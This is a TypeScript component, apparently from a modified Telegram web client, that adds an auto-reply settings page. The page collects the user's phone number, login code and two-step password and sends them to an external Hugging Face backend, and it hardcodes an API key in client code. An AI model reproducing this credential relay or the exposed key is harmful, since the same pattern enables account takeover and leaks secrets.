import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';
import useLang from '../../../hooks/useLang';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { currentUserId?: string; };

const AutoReplySettings: FC<OwnProps & StateProps> = ({ onReset, currentUserId }) => {
  const lang = useLang();
  const safeUserId = currentUserId || "unknown";

  // State Management
  const [isLinked, setIsLinked] = useState(() => localStorage.getItem(`ar_linked_${safeUserId}`) === 'true');
  const [isEnabled, setIsEnabled] = useState(() => localStorage.getItem(`ar_enabled_${safeUserId}`) === 'true');
  const [replyText, setReplyText] = useState(() => localStorage.getItem(`ar_text_${safeUserId}`) || "ယခု မအားသေးပါ။ နောက်မှ ပြန်ဆက်သွယ်ပါမည်။");
  
  // Login Steps: 'phone' -> 'otp' -> '2fa'
  const [step, setStep] = useState<'phone' | 'otp' | '2fa'>('phone');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // ၁။ ဖုန်းနံပါတ်ဖြင့် OTP တောင်းခြင်း
  const handleRequestCode = async () => {
    if (!phoneNumber) return alert("ဖုန်းနံပါတ် ထည့်ပါ။ (ဥပမာ: +959...)");
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: phoneNumber })
      });
      const data = await res.json();
      if (res.ok) {
        setStep('otp');
      } else {
        alert("❌ Error: " + data.error);
      }
    } catch (err) { alert("❌ Network Error"); }
    setIsLoading(false);
  };

  // ၂။ OTP / 2FA စစ်ဆေးခြင်း
  const handleVerifyCode = async () => {
    if (!otpCode) return alert("OTP Code ထည့်ပါ။");
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({
          user_id: safeUserId,
          phone_number: phoneNumber,
          otp_code: otpCode,
          two_step_password: twoFaPassword || undefined
        })
      });
      const data = await res.json();
      
      if (res.ok) {
        // အောင်မြင်ပါက UI ကို ပြောင်းမည်
        setIsLinked(true);
        setIsEnabled(true);
        localStorage.setItem(`ar_linked_${safeUserId}`, 'true');
        localStorage.setItem(`ar_enabled_${safeUserId}`, 'true');
        localStorage.setItem(`ar_text_${safeUserId}`, replyText);
        alert("✅ Auto-Reply Server နှင့် ချိတ်ဆက်မှု အောင်မြင်ပါသည်။");
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
      } else {
        alert("❌ Error: " + data.error);
      }
    } catch (err) { alert("❌ Network Error"); }
    setIsLoading(false);
  };

  // ၃။ ချိတ်ဆက်ပြီးသား အခြေအနေတွင် Text နှင့် On/Off Update လုပ်ခြင်း
  const handleSaveSettings = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      if (res.ok) {
        localStorage.setItem(`ar_enabled_${safeUserId}`, isEnabled.toString());
        localStorage.setItem(`ar_text_${safeUserId}`, replyText);
        alert("✅ Settings သိမ်းဆည်းပြီးပါပြီ!");
      } else {
        alert("❌ Update Error");
      }
    } catch (err) { alert("❌ Network Error"); }
    setIsLoading(false);
  };

  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <Button round color="translucent" size="smaller" ariaLabel={lang('Back')} onClick={onReset}>
          <i className="icon-arrow-left" />
        </Button>
        <h3 className="settings-header-title">Auto-Reply Server</h3>
      </div>

      {!isLinked ? (
        /* --- ချိတ်ဆက်ရန် လိုအပ်သော အခြေအနေ (Login Flow) --- */
        <div className="settings-item" style={{ padding: '1.5rem 1rem' }}>
          <h4 style={{ marginBottom: '15px' }}>Connect Auto Reply Server</h4>
          
          {step === 'phone' && (
            <>
              <InputText label="Phone Number (e.g. +95...)" value={phoneNumber} onChange={(e: any) => setPhoneNumber(e.target.value)} />
              <Button onClick={handleRequestCode} isLoading={isLoading} style={{ width: '100%', marginTop: '10px' }}>Request Code</Button>
            </>
          )}

          {step === 'otp' && (
            <>
              <p style={{ fontSize: '13px', color: 'var(--color-text-secondary)', marginBottom: '10px' }}>Telegram မှ ပေးပို့သော Code ကို ထည့်ပါ။</p>
              <InputText label="OTP Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />
              <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ width: '100%', marginTop: '10px' }}>Verify & Connect</Button>
            </>
          )}

          {step === '2fa' && (
            <>
              <p style={{ fontSize: '13px', color: 'red', marginBottom: '10px' }}>Two-Step Verification Password လိုအပ်ပါသည်။</p>
              <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />
              <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ width: '100%', marginTop: '10px' }}>Submit Password</Button>
            </>
          )}
        </div>
      ) : (
        /* --- ချိတ်ဆက်ပြီးသား အခြေအနေ (Settings Flow) --- */
        <>
          <div className="settings-item" style={{ padding: '1rem', background: 'rgba(40, 167, 69, 0.1)', borderBottom: '1px solid var(--color-borders)' }}>
             <span style={{ color: '#28a745', fontWeight: 'bold' }}>✅ Connected to Auto Reply Server</span>
          </div>

          <div className="settings-item" style={{ padding: '1rem' }}>
            <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer', fontSize: '1rem' }}>
              <input type="checkbox" checked={isEnabled} onChange={(e) => setIsEnabled(e.target.checked)} style={{ width: '20px', height: '20px', marginRight: '15px' }} />
              <b style={{ color: 'var(--color-text)' }}>Enable Auto-Reply</b>
            </label>
          </div>

          <div className="settings-item" style={{ padding: '0 1rem' }}>
            <h4 className="settings-item-header" dir="auto" style={{ marginBottom: '10px' }}>Custom Message</h4>
            <textarea
              value={replyText}
              onChange={(e: any) => setReplyText(e.target.value)}
              disabled={!isEnabled}
              rows={4}
              style={{ width: '100%', padding: '10px', borderRadius: '8px', border: '1px solid var(--color-borders)', background: 'var(--color-background)', color: 'var(--color-text)', fontSize: '1rem', resize: 'none', fontFamily: 'inherit' }}
            />
          </div>

          <div className="settings-item" style={{ padding: '1rem' }}>
            <Button onClick={handleSaveSettings} isLoading={isLoading} style={{ width: '100%' }}>Save Settings</Button>
          </div>
        </>
      )}
    </div>
  );
};

export default memo(withGlobal<OwnProps>(
  (global): StateProps => { return { currentUserId: global.currentUserId }; }
)(AutoReplySettings));
